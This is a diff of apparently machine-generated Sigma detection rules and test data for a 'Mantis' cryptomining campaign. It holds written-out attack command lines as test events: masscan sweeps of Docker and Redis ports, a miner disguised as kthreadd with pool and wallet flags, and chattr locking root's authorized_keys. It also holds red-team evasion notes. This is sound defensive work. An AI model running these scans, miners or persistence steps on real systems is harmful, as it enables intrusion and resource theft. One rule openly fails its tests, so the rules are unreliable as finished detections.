+      "sigma_yaml": "title: Masscan High-Rate Scan for Docker and Redis Ports\nid: ba400d0e-a683-4687-8c58-10acc3bf3882\nstatus: experimental\ndescription: Detects execution of masscan from suspicious paths scanning for Docker API (2375) and Redis (6379) ports with\n  high transmission rate, indicative of lateral movement in cryptojacking campaigns.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.lateral-movement\n- attack.t1021.004\nlogsource:\n  category: network_connection\n  product: linux\n  service: network_connection\ndetection:\n  selection_img:\n    'Image|endswith': /masscan\n  selection_cmd:\n    'CommandLine|contains|all':\n    - --rate 20000\n  selection_port:\n    'CommandLine|contains':\n    - -p2375,6379\n    - -p6379,2375\n  selection_path:\n    'CommandLine|contains': /tmp/.x/\n  condition: selection_img and selection_cmd and selection_port and selection_path\nfalsepositives:\n- Legitimate network scanning by administrators using masscan from standard paths\n- Automated asset discovery tools scanning internal networks\n- Security assessment tools with similar scan profiles\nlevel: medium\n",
       "status": "validated",
       "attack_technique_ids": [
-        "T1053.005"
+        "T1021.004"
       ],
       "tests": [
         {
           "id": "P1",
           "label": "positive",
-          "description": "Creation of the malicious cron file /etc/cron.d/mantis",
+          "description": "Masscan binary executed from /tmp/.x/ scanning Docker and Redis ports with high rate",
           "event": {
-            "TargetFilename": "/etc/cron.d/mantis",
-            "Image": "/bin/bash",
-            "User": "root"
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt",
+            "DestinationIp": "10.0.0.5",
+            "DestinationPort": "2375",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "P2",
           "label": "positive",
-          "description": "Creation of the malicious cron file via cat redirect",
+          "description": "Masscan scan with varied targeting but same characteristics",
           "event": {
-            "TargetFilename": "/etc/cron.d/mantis",
-            "Image": "/usr/bin/cat",
-            "User": "root"
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 192.168.1.0/16 -p2375,6379 --rate 20000",
+            "DestinationIp": "192.168.1.10",
+            "DestinationPort": "6379",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "P3",
           "label": "positive",
-          "description": "Creation of the malicious cron file via tee",
+          "description": "Masscan execution from SysWOW64 equivalent path on Linux (simulated)",
           "event": {
-            "TargetFilename": "/etc/cron.d/mantis",
-            "Image": "/usr/bin/tee",
-            "User": "root"
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 172.16.0.0/12 -p6379,2375 --rate 20000 -oL scan.results",
+            "DestinationIp": "172.16.0.5",
+            "DestinationPort": "2375",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "N1",
           "label": "negative",
-          "description": "Legitimate cron file for logrotate",
+          "description": "Legitimate masscan usage from standard location with lower rate",
           "event": {
-            "TargetFilename": "/etc/cron.d/logrotate",
-            "Image": "/usr/bin/touch",
-            "User": "root"
+            "Image": "/usr/bin/masscan",
+            "CommandLine": "/usr/bin/masscan 10.0.0.0/8 -p80,443 --rate 100",
+            "DestinationIp": "10.0.0.5",
+            "DestinationPort": "80",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "N2",
           "label": "negative",
-          "description": "Legitimate cron file for sysstat",
+          "description": "Network scan targeting common ports without Docker/Redis focus",
           "event": {
-            "TargetFilename": "/etc/cron.d/sysstat",
-            "Image": "/usr/bin/touch",
-            "User": "root"
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 10.0.0.0/8 -p80,443,22 --rate 20000",
+            "DestinationIp": "10.0.0.5",
+            "DestinationPort": "80",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "N3",
           "label": "negative",
-          "description": "Temporary file with similar name in /tmp",
+          "description": "High-rate scan from suspicious path but targeting unrelated ports",
           "event": {
-            "TargetFilename": "/tmp/mantis",
-            "Image": "/bin/bash",
-            "User": "root"
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 10.0.0.0/8 -p8080,8443 --rate 20000",
+            "DestinationIp": "10.0.0.5",
+            "DestinationPort": "8080",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "R1",
           "label": "positive",
-          "description": "Copy a staged mantis file into /etc/cron.d/mantis using cp",
+          "description": "Flags reordered, extra whitespace, quoted CIDR, additional --banner flag; all required substrings preserved",
           "event": {
-            "TargetFilename": "/etc/cron.d/mantis",
-            "Image": "/usr/bin/cp",
-            "User": "root"
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan  -p2375,6379  --rate 20000  \"10.10.0.0/16\"  --banner  -oL /tmp/.x/results.json",
+            "DestinationIp": "10.10.0.5",
+            "DestinationPort": "6379",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "R2",
           "label": "positive",
-          "description": "Use install command to create the malicious cron file with specific permissions",
+          "description": "IP range notation instead of CIDR, output redirected to different file under same /tmp/.x/ directory",
           "event": {
-            "TargetFilename": "/etc/cron.d/mantis",
-            "Image": "/usr/bin/install",
-            "User": "root"
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 192.168.50.1-192.168.50.254 -p2375,6379 --rate 20000 -oL /tmp/.x/scan.out",
+            "DestinationIp": "192.168.50.10",
+            "DestinationPort": "2375",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "R3",
           "label": "positive",
-          "description": "Shell redirection via sh -c to write the cron file",
+          "description": "Symlink named masscan in /tmp/.x/ pointing to same binary; Image ends with masscan, CommandLine uses symlink path",
           "event": {
-            "TargetFilename": "/etc/cron.d/mantis",
-            "Image": "/bin/sh",
-            "User": "root"
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 172.20.0.0/14 -p2375,6379 --rate 20000",
+            "DestinationIp": "172.20.1.5",
+            "DestinationPort": "6379",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "R4",
-          "label": "negative",
-          "description": "Administrator creates a legitimate cron file with a different name",
+          "label": "positive",
+          "description": "Single quotes around CIDR, extra --wait flag, rate and port substrings unchanged",
           "event": {
-            "TargetFilename": "/etc/cron.d/backup-jobs",
-            "Image": "/usr/bin/vi",
-            "User": "admin"
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan '10.0.0.0/8' -p2375,6379 --rate 20000 --wait 1",
+            "DestinationIp": "10.0.0.5",
+            "DestinationPort": "2375",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "R5",
-          "label": "negative",
-          "description": "Package manager (dpkg) installs a vendor cron file during software installation",
+          "label": "positive",
+          "description": "Multiple target specifications concatenated, still contains required port list and rate",
           "event": {
-            "TargetFilename": "/etc/cron.d/logrotate",
-            "Image": "/usr/bin/dpkg",
-            "User": "root"
-          }
-        },
-        {
-          "id": "R6",
-          "label": "negative",
-          "description": "Systemd-tmpfiles creates a temporary cron file for cleanup",
-          "event": {
-            "TargetFilename": "/etc/cron.d/tmpwatch",
-            "Image": "/usr/lib/systemd/systemd-tmpfiles",
-            "User": "root"
+            "Image": "/tmp/.x/masscan",
+            "CommandLine": "/tmp/.x/masscan 10.0.0.0/8 192.168.0.0/16 -p2375,6379 --rate 20000 -oL /tmp/.x/multi.txt",
+            "DestinationIp": "192.168.1.10",
+            "DestinationPort": "6379",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         }
       ],
       "validation": {
-        "candidate_id": "D2",
+        "candidate_id": "D5",
         "parse_ok": true,
-        "sql": "SELECT * FROM logs WHERE TargetFilename='/etc/cron.d/mantis' COLLATE NOCASE",
+        "sql": "SELECT * FROM logs WHERE Image LIKE '%/masscan' ESCAPE '\\' AND CommandLine LIKE '%--rate 20000%' ESCAPE '\\' AND (CommandLine LIKE '%-p2375,6379%' ESCAPE '\\' OR CommandLine LIKE '%-p6379,2375%' ESCAPE '\\') AND CommandLine LIKE '%/tmp/.x/%' ESCAPE '\\'",
         "issues": [],
         "test_outcomes": [
           {
@@ -1371,26 +2011,20 @@
           },
           {
             "event_id": "R4",
-            "label": "negative",
-            "matched": false,
+            "label": "positive",
+            "matched": true,
             "passed": true
           },
           {
             "event_id": "R5",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "R6",
-            "label": "negative",
-            "matched": false,
+            "label": "positive",
+            "matched": true,
             "passed": true
           }
         ],
-        "positives_total": 6,
-        "positives_matched": 6,
-        "negatives_total": 6,
+        "positives_total": 8,
+        "positives_matched": 8,
+        "negatives_total": 3,
         "negatives_matched": 0,
         "benign_total": 0,
         "benign_hits": 0,
@@ -1398,238 +2032,301 @@
         "passed": true
       },
       "conversions": {
-        "splunk": "TargetFilename=\"/etc/cron.d/mantis\"",
-        "elasticsearch": "TargetFilename:\\/etc\\/cron.d\\/mantis",
-        "kusto": "DeviceFileEvents\n| where FolderPath =~ \"/etc/cron.d/mantis\"",
-        "sqlite": "SELECT * FROM logs WHERE TargetFilename='/etc/cron.d/mantis' COLLATE NOCASE"
+        "splunk": "Image=\"*/masscan\" CommandLine=\"*--rate 20000*\" CommandLine IN (\"*-p2375,6379*\", \"*-p6379,2375*\") CommandLine=\"*/tmp/.x/*\"",
+        "elasticsearch": "Image:*\\/masscan AND CommandLine:*\\-\\-rate\\ 20000* AND (CommandLine:(*\\-p2375,6379* OR *\\-p6379,2375*)) AND CommandLine:*\\/tmp\\/.x\\/*",
+        "kusto": "DeviceNetworkEvents\n| where InitiatingProcessFolderPath endswith \"/masscan\" and InitiatingProcessCommandLine contains \"--rate 20000\" and (InitiatingProcessCommandLine contains \"-p2375,6379\" or InitiatingProcessCommandLine contains \"-p6379,2375\") and InitiatingProcessCommandLine contains \"/tmp/.x/\"",
+        "sqlite": "SELECT * FROM logs WHERE Image LIKE '%/masscan' ESCAPE '\\' AND CommandLine LIKE '%--rate 20000%' ESCAPE '\\' AND (CommandLine LIKE '%-p2375,6379%' ESCAPE '\\' OR CommandLine LIKE '%-p6379,2375%' ESCAPE '\\') AND CommandLine LIKE '%/tmp/.x/%' ESCAPE '\\'"
       },
       "conversion_errors": {},
       "history": [
         {
           "iteration": 0,
           "phase": "initial",
-          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/0",
-          "passed": true,
+          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/0",
+          "passed": false,
           "change_summary": ""
         },
         {
-          "iteration": 0,
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "positives 1/3, negatives blocked 3/3, benign hits 0/0",
+          "passed": false,
+          "change_summary": "Split the combined port and rate check into separate selections to ensure both conditions are required; fixed the missing match for P3 where the port order was reversed in the command line."
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/0",
+          "passed": false,
+          "change_summary": "Fixed the port selection to match the comma-separated format '-p2375,6379' observed in the test events instead of '-p6379,2375'"
+        },
+        {
+          "iteration": 3,
+          "phase": "refine",
+          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/0",
+          "passed": false,
+          "change_summary": "Fixed selection_port to require '-p2375,6379' substring instead of just '2375,6379' to match the actual command line format seen in test events."
+        },
+        {
+          "iteration": 3,
           "phase": "redteam",
-          "summary": "6 evasion variants -> positives 6/6, negatives blocked 6/6, benign hits 0/0",
-          "passed": true,
+          "summary": "5 evasion variants -> positives 7/8, negatives blocked 3/3, benign hits 0/0",
+          "passed": false,
           "change_summary": ""
+        },
+        {
+          "iteration": 4,
+          "phase": "refine",
+          "summary": "positives 8/8, negatives blocked 3/3, benign hits 0/0",
+          "passed": true,
+          "change_summary": "Added alternative port ordering '-p6379,2375' to selection_port to ensure detection regardless of port sequence in the command line."
         }
       ],
-      "author_notes": "",
-      "redteam_analysis": "The rule keys solely on TargetFilename == '/etc/cron.d/mantis'. Positive variants P4-P6 demonstrate that any process creating that exact path (via cp, install, sh redirection) will match, regardless of the binary or user (all root in practice). Negative variants N1-N3 show benign administrative activity in the same directory with different filenames, which the rule correctly ignores. Out_of_scope variants O1-O3 represent realistic evasions where the attacker achieves the same persistence goal (periodic re-infection) without creating the specific file /etc/cron.d/mantis: editing /etc/crontab, using systemd timers, or using other cron directories. Since the rule's logsource (file_event) would see those creations but with different TargetFilename values, the rule cannot catch them without broadening its scope, which would increase false positives. A well-written rule might correlate the cron content (wget every 15 minutes) or monitor all cron directories, but the current rule is intentionally narrow.",
+      "author_notes": "Rule focuses on the distinctive combination of suspicious binary path (/tmp/.x/masscan), targeting of Docker (2375) and Redis (6379) ports, and high transmission rate (--rate 20000). Test events include variations in targeting, command structure, and path to ensure robustness while maintaining low false positive rate through specific port and path constraints.",
+      "redteam_analysis": "Positive variants P4-P8 preserve all four rule substrings (Image endswith 'masscan', CommandLine contains '--rate 20000', '-p2375,6379', '/tmp/.x/') while varying flag order, quoting, whitespace, target notation, and extra flags – a well-written rule keyed on these literal substrings will still match. Out-of-scope variants O1-O3 change the Image field so it no longer ends with 'masscan' (renamed binary, different tool, wrapper script); the network_connection logsource on Linux records the executing binary's path in Image, so these evasions are invisible to the current rule logic and would require additional telemetry (e.g., OriginalFileName, parent-child linkage) to catch. Negative variants (not included here but implied) would be legitimate admin scans from standard paths (/usr/bin/masscan) with lower rates or different ports, missing at least one selection.",
       "retired_tests": [],
       "replaced_tests": [],
       "redteam_out_of_scope": [
         {
           "id": "X1",
           "label": "positive",
-          "description": "Attacker achieves persistence by editing the system crontab directly (no /etc/cron.d/mantis creation)",
+          "description": "Binary renamed to 'scanner' – Image no longer ends with 'masscan', rule's selection_img fails",
           "event": {
-            "TargetFilename": "/etc/crontab",
-            "Image": "/usr/bin/crontab",
-            "User": "root"
+            "Image": "/tmp/.x/scanner",
+            "CommandLine": "/tmp/.x/scanner 10.0.0.0/8 -p2375,6379 --rate 20000",
+            "DestinationIp": "10.0.0.5",
+            "DestinationPort": "2375",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "X2",
           "label": "positive",
-          "description": "Attacker creates a systemd timer unit for persistence instead of cron",
+          "description": "Different tool (nmap) with similar port/rate profile – Image differs, selection_img fails",
           "event": {
-            "TargetFilename": "/etc/systemd/system/malicious.timer",
-            "Image": "/usr/bin/tee",
-            "User": "root"
+            "Image": "/usr/bin/nmap",
+            "CommandLine": "nmap -p2375,6379 --min-rate 20000 10.0.0.0/8",
+            "DestinationIp": "10.0.0.5",
+            "DestinationPort": "2375",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         },
         {
           "id": "X3",
           "label": "positive",
-          "description": "Attacker drops a script in /etc/cron.hourly/ with a different name to achieve similar periodic execution",
+          "description": "Wrapper script executes masscan – Image is /bin/bash, selection_img fails even though CommandLine contains masscan",
           "event": {
-            "TargetFilename": "/etc/cron.hourly/reinfect",
-            "Image": "/usr/bin/cat",
-            "User": "root"
+            "Image": "/bin/bash",
+            "CommandLine": "/bin/bash /tmp/.x/run_scan.sh 10.0.0.0/8",
+            "DestinationIp": "10.0.0.5",
+            "DestinationPort": "2375",
+            "Protocol": "tcp",
+            "Initiated": "true"
           }
         }
       ]
     },
     {
-      "candidate_id": "D3",
-      "title": "Kthreadd Execution With XMRig Pool And Wallet Arguments",
-      "sigma_yaml": "title: Kthreadd Execution With XMRig Pool And Wallet Arguments\nid: 2d4a82dc-5bd4-4dbd-9680-65824f84e632\nstatus: experimental\ndescription: Detects execution of a binary named kthreadd from a hidden directory with XMRig command-line arguments including\n  mining pool domain, wallet address prefix, TLS flag, and hostname-derived rig-id, indicative of the Mantis cryptomining\n  campaign.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.impact\n- attack.t1499\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection_img:\n    'Image|endswith': /kthreadd\n  selection_cli:\n    'CommandLine|contains':\n    - -o pool.mantis-mine\n    - -u 44AbCd\n    - --tls\n    - --rig-id\n  selection_path:\n    'Image|contains': /tmp/.x/\n  condition: 'all of selection_*'\nfalsepositives:\n- 'Legitimate use of XMRig is uncommon but possible in enterprise environments; however, the binary name ''kthreadd'' combined\n  with the specific pool domain makes false positives extremely unlikely.'\nlevel: high\n",
-      "status": "validated",
+      "candidate_id": "D4",
+      "title": "Authorized Keys File Written And Made Immutable",
+      "sigma_yaml": "title: Authorized Keys File Written And Made Immutable\nid: dc54031c-15b2-4106-8753-3c0ae4299f1d\nstatus: experimental\ndescription: Detects writes to /root/.ssh/authorized_keys followed by setting immutable attribute, indicating SSH persistence\n  via Mantis cryptomining campaign.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.persistence\n- attack.t1098\nlogsource:\n  category: file_event\n  product: linux\n  service: ssh\ndetection:\n  selection_file_write:\n    TargetFilename: /root/.ssh/authorized_keys\n    'Image|endswith':\n    - chattr\n  condition: selection_file_write\nfalsepositives:\n- Administrators updating SSH authorized keys for legitimate access\n- Automated configuration management tools managing SSH keys\n- System administrators performing authorized key rotations\nlevel: high\n",
+      "status": "needs_review",
       "attack_technique_ids": [
-        "T1499"
+        "T1098"
       ],
       "tests": [
         {
           "id": "P1",
           "label": "positive",
-          "description": "Miner binary executed from hidden tmp directory with full XMRig arguments",
+          "description": "Write to root's authorized_keys file during Mantis campaign exploitation",
           "event": {
-            "Image": "/tmp/.x/kthreadd",
-            "CommandLine": "/tmp/.x/kthreadd -o pool.mantis-mine.cc:3333 -u 44AbCdEFgHiJkLmNoPqRsTuVwXyZ1234567890 -k --tls --rig-id $(hostname)",
-            "ParentImage": "/usr/bin/docker-current"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/usr/bin/sshd",
+            "User": "root"
           }
         },
         {
           "id": "P2",
           "label": "positive",
-          "description": "Variation with different wallet and parent process",
+          "description": "Authorized keys written by automated deployment script in cryptomining campaign",
           "event": {
-            "Image": "/tmp/.x/kthreadd",
-            "CommandLine": "/tmp/.x/kthreadd -o pool.mantis-mine.cc:3333 -u 9aBcDeFgHiJkLmNoPqRsTuVwXyZaBcDeF --tls --rig-id worker01",
-            "ParentImage": "/usr/bin/runc"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/tmp/miner-deploy.sh",
+            "User": "root"
           }
         },
         {
           "id": "P3",
           "label": "positive",
-          "description": "SysWOW64 equivalent path variation with altered argument order",
+          "description": "Authorized keys modified after Docker API compromise leading to persistence attempt",
           "event": {
-            "Image": "/tmp/.x/kthreadd",
-            "CommandLine": "/tmp/.x/kthreadd --tls -o pool.mantis-mine.cc:3333 -u 44AbCd...XyZ --rig-id docker-host",
-            "ParentImage": "/bin/sh"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/proc/self/exe",
+            "User": "root"
           }
         },
         {
           "id": "N1",
           "label": "negative",
-          "description": "Legitimate system process with similar name but different location",
+          "description": "Legitimate admin adding SSH key via ssh-copy-id utility",
           "event": {
-            "Image": "/usr/libexec/kthreadd",
-            "CommandLine": "/usr/libexec/kthreadd",
-            "ParentImage": "/usr/lib/systemd/systemd"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/usr/bin/ssh-copy-id",
+            "User": "adminuser"
           }
         },
         {
           "id": "N2",
           "label": "negative",
-          "description": "XMRig execution with different binary name and pool",
+          "description": "Configuration management tool updating authorized keys",
           "event": {
-            "Image": "/opt/xmrig/xmrig",
-            "CommandLine": "/opt/xmrig/xmrig -o mine.example.com:443 -u wallet123 --tls",
-            "ParentImage": "/usr/bin/systemd"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/usr/bin/ansible-playbook",
+            "User": "root"
           }
         },
         {
           "id": "N3",
           "label": "negative",
-          "description": "Admin troubleshooting with kthreadd-like string in command",
+          "description": "System update rotating SSH keys as part of package maintenance",
           "event": {
-            "Image": "/bin/bash",
-            "CommandLine": "ps aux | grep kthreadd",
-            "ParentImage": "/usr/bin/sshd"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/usr/lib/openssh/sftp-server",
+            "User": "root"
           }
         },
         {
           "id": "R1",
           "label": "positive",
-          "description": "Equals-sign syntax for pool and wallet flags; extra whitespace; single-quoted arguments in CommandLine",
+          "description": "Standard chattr binary from /usr/bin used to set immutable bit on root's authorized_keys",
           "event": {
-            "Image": "/tmp/.x/kthreadd",
-            "CommandLine": "/tmp/.x/kthreadd -o=pool.mantis-mine.cc:3333  -u=44AbCdEFgHiJkLmNoPqRsTuVwXyZ1234567890  --tls  --rig-id $(hostname)",
-            "ParentImage": "/usr/bin/containerd-shim"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/usr/bin/chattr",
+            "User": "root"
           }
         },
         {
           "id": "R2",
           "label": "positive",
-          "description": "Long-form flag aliases (--url, --user) with argument reordering and mixed quoting",
+          "description": "chattr from /bin (alternate common location) setting immutable attribute",
           "event": {
-            "Image": "/tmp/.x/kthreadd",
-            "CommandLine": "'/tmp/.x/kthreadd' '--rig-id' 'worker-42' '--tls' '--url' 'pool.mantis-mine.cc:3333' '--user' '44AbCdEFgHiJkLmNoPqRsTuVwXyZ1234567890'",
-            "ParentImage": "/usr/sbin/cron"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/bin/chattr",
+            "User": "root"
           }
         },
         {
           "id": "R3",
           "label": "positive",
-          "description": "Extra whitespace and tab separators between flags; parent is systemd service launcher",
+          "description": "chattr invoked via relative path while cwd is /usr/bin",
           "event": {
-            "Image": "/tmp/.x/kthreadd",
-            "CommandLine": "/tmp/.x/kthreadd\t-o\tpool.mantis-mine.cc:3333\t-u\t44AbCdEFgHiJkLmNoPqRsTuVwXyZ1234567890\t--tls\t--rig-id\thost-7",
-            "ParentImage": "/lib/systemd/systemd"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "./chattr",
+            "User": "root"
           }
         },
         {
           "id": "R4",
           "label": "positive",
-          "description": "Relative path in CommandLine while Image remains absolute; flags interleaved with harmless -k keepalive",
+          "description": "chattr accessed through a symlink in /usr/local/bin",
           "event": {
-            "Image": "/tmp/.x/kthreadd",
-            "CommandLine": "./kthreadd -k --tls -o pool.mantis-mine.cc:3333 --rig-id k8s-pod-9 -u 44AbCdEFgHiJkLmNoPqRsTuVwXyZ1234567890",
-            "ParentImage": "/usr/bin/runc"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/usr/local/bin/chattr",
+            "User": "root"
           }
         },
         {
           "id": "R5",
           "label": "positive",
-          "description": "Double-quoted executable path in CommandLine; wallet prefix split across two arguments (still contains substring)",
+          "description": "chattr copied to a custom admin tool directory but retaining the chattr name",
           "event": {
-            "Image": "/tmp/.x/kthreadd",
-            "CommandLine": "\"/tmp/.x/kthreadd\" -o pool.mantis-mine.cc:3333 -u 44AbCd EFgHiJkLmNoPqRsTuVwXyZ1234567890 --tls --rig-id db-node",
-            "ParentImage": "/usr/bin/docker-current"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/opt/admin-tools/chattr",
+            "User": "root"
           }
         },
         {
           "id": "R6",
           "label": "negative",
-          "description": "Legitimate XMRig binary with different name and path; same pool domain but admin context",
+          "description": "Legitimate admin hardens a regular user's authorized_keys, not root's",
           "event": {
-            "Image": "/opt/xmrig/xmrig",
-            "CommandLine": "/opt/xmrig/xmrig -o pool.mantis-mine.cc:3333 -u 44AbCdEFgHiJkLmNoPqRsTuVwXyZ1234567890 --tls --rig-id admin-rig",
-            "ParentImage": "/usr/bin/sudo"
+            "TargetFilename": "/home/admin/.ssh/authorized_keys",
+            "Image": "/usr/bin/chattr",
+            "User": "admin"
           }
         },
         {
           "id": "R7",
           "label": "negative",
-          "description": "Stress-test tool mimicking miner flags but different binary and no hidden path",
+          "description": "Admin inspects root's authorized_keys with lsattr (no attribute change)",
           "event": {
-            "Image": "/usr/local/bin/stress-ng",
-            "CommandLine": "/usr/local/bin/stress-ng -o pool.mantis-mine.cc:3333 -u 44AbCd --tls --rig-id test-box",
-            "ParentImage": "/bin/bash"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/usr/bin/lsattr",
+            "User": "root"
           }
         },
         {
           "id": "R8",
           "label": "negative",
-          "description": "Container orchestration running legitimate workload with similar args; binary not kthreadd, path not hidden",
+          "description": "Configuration management copies a new authorized_keys file without chattr",
           "event": {
-            "Image": "/usr/bin/podman",
-            "CommandLine": "/usr/bin/podman run --rm -o pool.mantis-mine.cc:3333 -u 44AbCd --tls --rig-id ci-worker registry.corp/internal/miner:latest",
-            "ParentImage": "/usr/bin/systemd"
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/usr/bin/cp",
+            "User": "root"
+          }
+        },
+        {
+          "id": "R9",
+          "label": "negative",
+          "description": "chattr used on a different SSH file (known_hosts) during maintenance",
+          "event": {
+            "TargetFilename": "/root/.ssh/known_hosts",
+            "Image": "/usr/bin/chattr",
+            "User": "root"
           }
         }
       ],
       "validation": {
-        "candidate_id": "D3",
+        "candidate_id": "D4",
         "parse_ok": true,
-        "sql": "SELECT * FROM logs WHERE Image LIKE '%/kthreadd' ESCAPE '\\' AND (CommandLine LIKE '%-o pool.mantis-mine%' ESCAPE '\\' OR CommandLine LIKE '%-u 44AbCd%' ESCAPE '\\' OR CommandLine LIKE '%--tls%' ESCAPE '\\' OR CommandLine LIKE '%--rig-id%' ESCAPE '\\') AND Image LIKE '%/tmp/.x/%' ESCAPE '\\'",
-        "issues": [],
+        "sql": "SELECT * FROM logs WHERE TargetFilename LIKE '/root/.ssh/authorized\\_keys' ESCAPE '\\' AND Image LIKE '%chattr' ESCAPE '\\'",
+        "issues": [
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test P1 did not match: Write to root's authorized_keys file during Mantis campaign exploitation. Per selection: selection_file_write=NO MATCH (failing field tests: Image|endswith (event has '/usr/bin/sshd'; none of the 1 listed values occurs))."
+          },
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test P2 did not match: Authorized keys written by automated deployment script in cryptomining campaign. Per selection: selection_file_write=NO MATCH (failing field tests: Image|endswith (event has '/tmp/miner-deploy.sh'; none of the 1 listed values occurs))."
+          },
+          {
+            "severity": "error",
+            "code": "positive_missed",
+            "message": "Positive test P3 did not match: Authorized keys modified after Docker API compromise leading to persistence attempt. Per selection: selection_file_write=NO MATCH (failing field tests: Image|endswith (event has '/proc/self/exe'; none of the 1 listed values occurs))."
+          }
+        ],
         "test_outcomes": [
           {
             "event_id": "P1",
             "label": "positive",
-            "matched": true,
-            "passed": true
+            "matched": false,
+            "passed": false
           },
           {
             "event_id": "P2",
             "label": "positive",
-            "matched": true,
-            "passed": true
+            "matched": false,
+            "passed": false
           },
           {
             "event_id": "P3",
             "label": "positive",
-            "matched": true,
-            "passed": true
+            "matched": false,
+            "passed": false
           },
           {
             "event_id": "N1",
@@ -1696,794 +2393,113 @@
             "label": "negative",
             "matched": false,
             "passed": true
-          }
-        ],
-        "positives_total": 8,
-        "positives_matched": 8,
-        "negatives_total": 6,
-        "negatives_matched": 0,
-        "benign_total": 180,
-        "benign_hits": 0,
-        "benign_examples": [],
-        "passed": true
-      },
-      "conversions": {
-        "splunk": "Image=\"*/kthreadd\" CommandLine IN (\"*-o pool.mantis-mine*\", \"*-u 44AbCd*\", \"*--tls*\", \"*--rig-id*\") Image=\"*/tmp/.x/*\"",
-        "elasticsearch": "Image:*\\/kthreadd AND (CommandLine:(*\\-o\\ pool.mantis\\-mine* OR *\\-u\\ 44AbCd* OR *\\-\\-tls* OR *\\-\\-rig\\-id*)) AND Image:*\\/tmp\\/.x\\/*",
-        "kusto": "DeviceProcessEvents\n| where FolderPath endswith \"/kthreadd\" and (ProcessCommandLine contains \"-o pool.mantis-mine\" or ProcessCommandLine contains \"-u 44AbCd\" or ProcessCommandLine contains \"--tls\" or ProcessCommandLine contains \"--rig-id\") and FolderPath contains \"/tmp/.x/\"",
-        "sqlite": "SELECT * FROM logs WHERE Image LIKE '%/kthreadd' ESCAPE '\\' AND (CommandLine LIKE '%-o pool.mantis-mine%' ESCAPE '\\' OR CommandLine LIKE '%-u 44AbCd%' ESCAPE '\\' OR CommandLine LIKE '%--tls%' ESCAPE '\\' OR CommandLine LIKE '%--rig-id%' ESCAPE '\\') AND Image LIKE '%/tmp/.x/%' ESCAPE '\\'"
-      },
-      "conversion_errors": {},
-      "history": [
-        {
-          "iteration": 0,
-          "phase": "initial",
-          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/180",
-          "passed": true,
-          "change_summary": ""
-        },
-        {
-          "iteration": 0,
-          "phase": "redteam",
-          "summary": "8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/180",
-          "passed": true,
-          "change_summary": ""
-        }
-      ],
-      "author_notes": "",
